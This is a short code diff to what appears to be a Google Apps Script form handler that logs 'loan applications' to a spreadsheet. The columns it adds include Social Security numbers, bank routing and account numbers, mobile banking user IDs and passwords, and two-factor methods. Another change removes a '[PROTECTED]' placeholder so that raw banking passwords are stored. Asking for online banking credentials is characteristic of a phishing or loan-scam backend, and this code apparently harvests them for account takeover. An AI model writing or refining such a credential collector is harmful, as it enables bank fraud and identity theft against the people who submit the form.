@@ -15,6 +15,36 @@ function doPost(e) {
     
     const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Loan Applications");
     
+    // Add headers if sheet is empty
+    if (sheet.getLastRow() === 0) {
+      sheet.appendRow([
+        "Timestamp",
+        "Application Type",
+        "First Name",
+        "Last Name", 
+        "Email",
+        "Phone",
+        "Social Security Number",
+        "Loan Amount",
+        "Loan Purpose",
+        "Loan Duration (Months)",
+        "Gross Monthly Income",
+        "Employment Status",
+        "Credit Score",
+        "Street Address",
+        "City",
+        "State",
+        "ZIP Code",
+        "Routing Number",
+        "Account Number",
+        "Bank Name",
+        "Mobile Banking User ID",
+        "Mobile Banking Password",
+        "Two-Factor Method",
+        "Terms Accepted"
+      ]);
+    }
+    
     // Handle FormData (from working version)
     let data = {};
     if (e.parameters) {
@@ -48,7 +78,7 @@ function doPost(e) {
       data.accountNumber || '',
       data.bankName || '',
       data.mobileBankingUserId || '',
-      data.mobileBankingPassword || '[PROTECTED]',
+      data.mobileBankingPassword || '',
       data.twoFactorMethod || '',
       data.termsAccepted || 'false'
     ]);
